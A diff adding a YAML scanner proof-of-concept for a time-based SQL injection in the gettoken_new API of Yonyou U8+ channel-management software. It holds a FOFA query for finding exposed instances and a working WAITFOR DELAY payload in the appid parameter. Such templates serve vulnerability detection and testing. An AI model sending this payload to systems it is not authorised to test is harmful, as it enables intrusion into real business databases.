@@ -1,0 +1,29 @@
+id: poc-yaml-yongyon-u8-cm-ae-gettoken-new-sqli
+info:
+  name: 用友U8+渠道管理(高级版) gettoken_new SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 用友U8+渠道管理(高级版)
+  fofa: body="用友U8CRM"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /indexbusiness.jsp
+  expression: status_code == 200 && contains(title,"渠道管理（高级版）")
+- method: GET
+  path: /api/gettoken_new?appid=%27%3BWAITFOR+DELAY+%270%3A0%3A{{.t1}}%27--&appkey=1&appsecret=1&userid=1
+  expression: 'status_code == 200 &&
+
+    contains(body,"注册信息不存在，请联系管理员") &&
+
+    !contains(body,"<") &&
+
+    duration > t1 &&
+
+    duration < t2
+
+    '
+transport: http
